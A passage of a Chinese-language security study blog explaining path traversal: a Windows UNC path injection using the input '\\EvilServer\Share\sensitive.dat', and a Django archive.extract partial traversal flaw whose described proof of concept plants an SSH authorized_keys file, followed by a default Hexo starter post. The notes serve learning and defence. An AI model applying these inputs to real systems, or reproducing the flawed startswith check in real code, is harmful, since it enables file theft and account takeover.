<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 应用程序的本地临时目录</span><br><span class="line">TEMP_DIR = &quot;C:\App\Temp\&quot;</span><br><span class="line"></span><br><span class="line">// 接收用户输入的文件名</span><br><span class="line">user_input = get_param(&quot;filename&quot;) // 预期输入：data.tmp</span><br><span class="line"></span><br><span class="line">// 拼接路径</span><br><span class="line">full_path = TEMP_DIR + user_input  // 结果：C:\App\Temp\data.tmp</span><br><span class="line"></span><br><span class="line">// 对文件执行操作（如读取、写入、移动等）</span><br><span class="line">process_file(full_path) </span><br></pre></td></tr></table></figure>

<p>‍</p>
<p>由于应用程序只检查了本地路径的合法性，但未能检查输入是否以 <code>\\</code> 开头，攻击者可以注入一个完整的 UNC 路径。</p>
<p>攻击者构造一个指向网络上另一台服务器共享资源的 UNC 路径。</p>
<ul>
<li><strong>攻击者输入</strong> <strong>​<code>filename</code>​</strong>​ <strong>参数：</strong>  <code>\\EvilServer\Share\sensitive.dat</code></li>
</ul>
<p>应用程序简单地将这个输入拼接到 <code>TEMP_DIR</code>​ 之后：\text{Full Path} &#x3D; \text{“C:\App\Temp&quot;} + \text{“\EvilServer\Share\sensitive.dat”}</p>
<p>在 Windows 文件系统和 API 中，如果一个路径包含 ​<strong>两个连续的反斜杠</strong>  <strong>​<code>\\</code>​</strong> ​，操作系统会将其解释为​<strong>网络路径</strong>​，并尝试忽略其前面的本地路径部分（<code>C:\App\Temp\</code>）。</p>
<ul>
<li><strong>最终系统尝试访问的路径：</strong>  <code>\\EvilServer\Share\sensitive.dat</code></li>
</ul>
<p>‍</p>
<h2 id="3-4-Path-traversal-via-archive-extract-CVE-2021-3281-incomplete-patch"><a href="#3-4-Path-traversal-via-archive-extract-CVE-2021-3281-incomplete-patch" class="headerlink" title="3.4 Path traversal via archive.extract - CVE 2021-3281 incomplete patch"></a>3.4 Path traversal via archive.extract - CVE 2021-3281 incomplete patch</h2><p>‍</p>
<h3 id="1-漏洞核心：部分路径遍历-Partial-Path-Traversal"><a href="#1-漏洞核心：部分路径遍历-Partial-Path-Traversal" class="headerlink" title="1. 漏洞核心：部分路径遍历 (Partial Path Traversal)"></a>1. 漏洞核心：部分路径遍历 (Partial Path Traversal)</h3><ul>
<li><p><strong>漏洞类型</strong>：路径遍历 (CWE-22)。具体来说，是“部分路径遍历”。</p>
</li>
<li><p><strong>受影响组件</strong>​：<code>django.utils.archive.extract</code>​ 函数（涉及 <code>ZipArchive</code>​ 和 <code>TarArchive</code> 类）。</p>
</li>
<li><p><strong>CVE 编号</strong>：CVE-2025-59682（注意：这是报告中提到的新编号，修复了旧 CVE-2021-3281 的遗留问题）。</p>
</li>
<li><p><strong>根本原因</strong>​： 在之前的修复中，Django 使用 <code>os.path.abspath</code>​ 和 <code>startswith</code> 来检查解压路径是否在目标目录内。 代码逻辑大致如下：<br>Python</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target_path = os.path.abspath(to_path) # 例如 /var/lib</span><br><span class="line">filename = os.path.abspath(os.path.join(target_path, name)) # 例如 /var/library/test.txt</span><br><span class="line">if not filename.startswith(target_path): # 检查 /var/library/test.txt 是否以 /var/lib 开头</span><br><span class="line">    raise SuspiciousOperation(...)</span><br></pre></td></tr></table></figure>

<p><strong>问题在于</strong>​：<code>os.path.abspath(&quot;/var/lib/&quot;)</code>​ 会移除末尾的斜杠，变成 <code>/var/lib</code>​。因此，如果攻击者构造一个文件名解压到 <code>/var/library/test.txt</code>​，因为 <code>/var/library</code>​ 确实以 <code>/var/lib</code>​ 字符开头，所以 <code>startswith</code>​ 检查会​<strong>通过</strong>​。这允许攻击者将文件写入到与目标目录名称相似的兄弟目录中（例如，目标是 <code>/home/john</code>​，攻击者可以写入 <code>/home/johnny</code>）。</p>
</li>
</ul>
<h3 id="2-攻击场景与-PoC"><a href="#2-攻击场景与-PoC" class="headerlink" title="2. 攻击场景与 PoC"></a>2. 攻击场景与 PoC</h3><p>报告者 <code>stackered</code> 提供了一个非常清晰的 PoC：</p>
<ol>
<li><p><strong>场景假设</strong>​：假设系统中存在两个用户目录 <code>/home/john</code>​ (目标目录) 和 <code>/home/johnny</code> (攻击目标)。</p>
</li>
<li><p><strong>攻击构造</strong>：</p>
<ul>
<li>创建一个恶意 ZIP 文件。</li>
<li>包含一个指向 <code>/home/johnny/.ssh/authorized_keys</code> 的文件条目。</li>
<li>包含一个普通文件（用于绕过某些前置检查）。</li>
</ul>
</li>
<li><p><strong>执行过程</strong>：</p>
<ul>
<li>调用 <code>archive.extract(&quot;/home/john&quot;)</code>。</li>
<li>由于 <code>/home/johnny...</code>​ 以 <code>/home/john</code> 开头，防御逻辑失效。</li>
<li>恶意文件被成功写入 <code>/home/johnny/.ssh/authorized_keys</code>​，可能导致 SSH 密钥注入，从而获取 <code>johnny</code> 用户的权限。</li>
</ul>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2026/01/08/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/" data-id="cmkbf3udx0003ewvscil8cmv4" data-title="1.路径穿越" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/05/hello-world/" class="article-date">
  <time class="dt-published" datetime="2026-01-04T16:08:36.418Z" itemprop="datePublished">2026-01-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/05/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2026/01/05/hello-world/" data-id="cmkbf3udu0001ewvs2btvctq1" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/portswigger/">portswigger</a></li></ul>
    </div>
  </div>


  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/01/">January 2026</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2026/01/19/Server-side%20request%20forgery%20(SSRF)/">3.Server-side request forgery (SSRF)</a>
          </li>
        
          <li>
            <a href="/2026/01/12/Authentication%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/">2.Authentication身份验证</a>
          </li>
        
          <li>
            <a href="/2026/01/08/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/">1.路径穿越</a>
          </li>
        
          <li>
            <a href="/2026/01/05/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2026 hr1sto<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>